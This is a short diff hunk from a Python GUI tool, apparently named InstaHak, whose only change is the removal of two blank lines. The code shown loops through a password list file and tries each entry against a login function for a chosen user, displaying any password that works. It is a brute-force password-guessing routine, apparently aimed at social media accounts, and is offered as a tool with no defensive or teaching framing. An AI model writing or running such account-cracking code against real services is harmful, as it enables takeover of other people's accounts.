@@ -9,8 +9,6 @@ class app(InstaHak):
         passlst = dpg.get_value('pas')
         with dpg.window(label=f"trying {passlst}", width=200, height=200, pos=(200, 300)):
             for pas in open(passlst, 'r').read().split():
-                
-                
                 if self.login(user, pas):
                     print('found:', pas)
                     dpg.add_text(f'found: {pas}')
